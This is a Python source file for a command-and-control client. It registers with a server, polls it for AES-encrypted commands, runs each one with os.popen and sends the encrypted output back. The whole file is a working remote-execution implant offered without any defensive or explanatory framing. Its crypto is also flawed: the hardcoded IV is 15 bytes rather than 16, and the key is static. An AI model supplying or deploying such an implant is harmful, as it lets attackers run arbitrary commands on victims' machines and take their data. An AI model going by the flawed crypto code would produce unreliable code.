# c2_client.py
import time
import requests
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SERVER_URL = "http://127.0.0.1:5000"
SECRET_KEY = b'sixteen byte key'
CLIENT_ID = "client1"

def encrypt_message(message):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, b'iv_16bytes_long')
    return base64.b64encode(cipher.encrypt(pad(message.encode(), AES.block_size))).decode()

def decrypt_message(encoded_message):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, b'iv_16bytes_long')
    return unpad(cipher.decrypt(base64.b64decode(encoded_message)), AES.block_size).decode()

def register_client():
    response = requests.post(f"{SERVER_URL}/register_client", json={'client_id': CLIENT_ID})
    if response.status_code == 200:
        print(f"Registered successfully. Token: {response.json().get('token')}")
        return True
    return False

def fetch_command():
    try:
        response = requests.get(f"{SERVER_URL}/get_command/{CLIENT_ID}")
        if response.status_code == 200:
            encrypted_command = response.json().get('command')
            if encrypted_command:
                return decrypt_message(encrypted_command)
        return None
    except Exception as e:
        print(f"Error fetching command: {e}")
        return None

def send_result(result):
    try:
        encrypted_result = encrypt_message(result)
        requests.post(f"{SERVER_URL}/send_result", json={'client_id': CLIENT_ID, 'result': encrypted_result})
    except Exception as e:
        print(f"Error sending result: {e}")

def main():
    if not register_client():
        print("Failed to register client.")
        return

    while True:
        command = fetch_command()
        if command:
            print(f"Executing command: {command}")
            try:
                output = os.popen(command).read()
                send_result(output)
            except Exception as e:
                send_result(f"Error executing command: {e}")
        time.sleep(5)  # Polling interval

if __name__ == '__main__':
    main()
